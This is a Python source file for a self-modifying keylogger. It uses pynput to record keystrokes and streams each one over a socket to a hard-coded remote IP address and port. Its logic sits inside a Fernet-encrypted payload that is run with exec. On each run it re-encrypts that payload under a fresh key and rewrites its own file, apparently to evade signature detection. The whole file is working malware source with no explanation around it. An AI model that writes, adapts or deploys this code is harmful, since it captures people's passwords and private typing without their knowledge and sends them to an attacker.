from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import signal
import sys
import inspect
import hashlib
import socket

def pmorphic(key, token, f):
    payload = f.decrypt(token).decode() # decrypt encrypted payload
    exec(payload)

# STOP
key = "7-FGjiPAW8s5ElOrRVw7Kc5LQCI85s0ibKvAGeq7TEI=" # Fernet.generate_key()
token = "gAAAAABnWuyxWfvt9vRI9HYDb3UREL_jRoOcKPN7r3MC2kOsYvBVxYWWT9ehwPe9UF_Jp-UKJjknvoIqbWEW91v5iVwBNNGW6u6kbSu3oAQXq3f3y6IX383uuzxqH13m6672YRpNvatiyZa9vtKxfNRtI80I78mq6qGXQzDTINV3EWzkXWjT48fMl7iaJzkt6GsKyDb2yFwQ7fvPIZWbKu0HkpzHMyiKHM9YM_1WUtnZ82fkJEt6W-gWJrprQr5V-N4foy53f0ukshEAndfuEOQqSm_iT2DCK65MYlditCJEJVRVVFp4mA8MZ67d48biZU-pBUC-kxS31LXPsoWSw0zQjnskOWIjmxuyhi3x8F9VOiC3W8Cy3g7AXSS6uIJ-nIG5llt9_L5IbY5Lexey9R2ZyLEOWBXBu3GA3xM-gjEj4pL0BnAWTD-5rOab3KT-Zz8RflPbV-1v3Nyc8aY0h8KO2UCIde14zzeCntQlSa4pU2gJlywQofnwvhf0DEsJN2qEgFEGoST9tqKGvIe4AlumKRd-tzKZpcwSQVB274huhSVarEJ8exjeNe3OVom6a0SG6JZnrUdjyWGkWFkgxAfjtms5Yf_mCE9lERmPUqg2bxwcC95DeXIsEgMx2zVlit1OL8Ide2BzRs3ONVrkHuHjzE6h7-JFqIZ31NOucoCrnBnEbzhowyriDrVkJPRsism0p1CyPi_IcQxatXzyjwsJomVFHUuxeGPGi4UUvJp00MEmhMbbSSnvaN21sk6d_WWYo_ZgaaSurZcAPpFTt6HJv7BGgQAZEhw4qqxpGzZhlXrSAKGD4Gn6wf-Gobe1WzgA55WiS1mP0R1cSnzoKeY-UTQwAhZNJDwcgos-RFoovkb_HzCk6nRzGOa6AmOzNQGv5r2XPsa6sqho4UI6U8z9lbYfKHxhliYdQaolz4FUbTLPhvtMcaaJF99Nn-dzGEi33_044f_D4MnsxH4JAskAP0R2P3LjcMMZzZaOM7JOCnPgjTZUiVtk5raZYH1hZj-gR1MSxuAPxMl-p602NpktLINEufXgolJOKojF92lW6YTpCbRG4TffZw2QyomBvpDHSjTeFAO9bHKZUAh-t4b6fOWUW7BFR12nRvi_whamtxzL1nKiJ9ZUUJH6XLEyT1gFyLcPP1qxfu5XNEBfm6wc4VjGod9SAyhKKMmE5Fh7ya22LU3hmdYyYSS63CBdu5QlvAY978-pRjg1nmyp1_t3wEeXRS8CARkdAxJBY05W0Q5D6gV_sC9glnsusvRbavf0lvd7_is2uvrjYY5mt57UxTSidOy7HlswCN0hH70lUlbkCzzrjhtWju-nmawRsg1blNflSIm5jIqEVFtCtoPXJZYTG7XL492g7F6e8lPWBX51CID7ILINUZozXv5gIEwvoJBetMo10s-BFjjFpCqNau4Z3Fom31W2g1SmrKBXKdV3qe3K83rAu2xbcV8ZePayXwZOWgyJ5y-CiycMrSyRqYz16C0Kz2Wzikv8bdk6bA12q7dWDgMxgulnCYRLQv4S3k8JSgYxeb8_9rCNrMQaIgZFtMGZzNnpCnpMvBYH6XutxkFtzbufICl_EXi7ethjEOSmFPBmiAdLOFFwni8libzyU_vgWwR-igOEQs0hrsX2K2VXtlA="
f = Fernet(key)

def gen_token():
    global token, key, f
    payload = """
import socket

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('192.168.43.220', 8089))

def on_press(key):
    global clientsocket
    msg = str(key)
    clientsocket.send(msg.encode())

global token, key

f = Fernet(key)
mal = f.decrypt(token).decode()

key = Fernet.generate_key()
f = Fernet(key)

token = f.encrypt(mal.encode())

filename = os.path.basename(__file__)
lines = []
with open(filename, 'r') as newfile:
    lines = newfile.readlines()

with open('new', 'w') as newfile:
    for line in lines:
        if line.startswith('# STOP'):
            break
        newfile.write(line)

    newfile.write('# STOP\\n')
    newfile.write('key = \\"{}\\"\\n'.format(key.decode()))
    newfile.write('token = \\"{}\\"\\n'.format(token.decode()))
    newfile.write('f = Fernet(key)\\n')
    newfile.write('pmorphic(key, token, f)\\n')

def handle_termination(signal, frame):
    filename = __file__
    print('Exiting..')
    os.rename(filename, 'old')
    os.rename('new', filename)
    os.remove('old')
    sys.exit(0)

signal.signal(signal.SIGINT, handle_termination)

with Listener(
    on_press=on_press
) as listener:
    listener.join()
    """
    print(f.encrypt(payload.encode()))

#pmorphic(key, token, f)
gen_token()
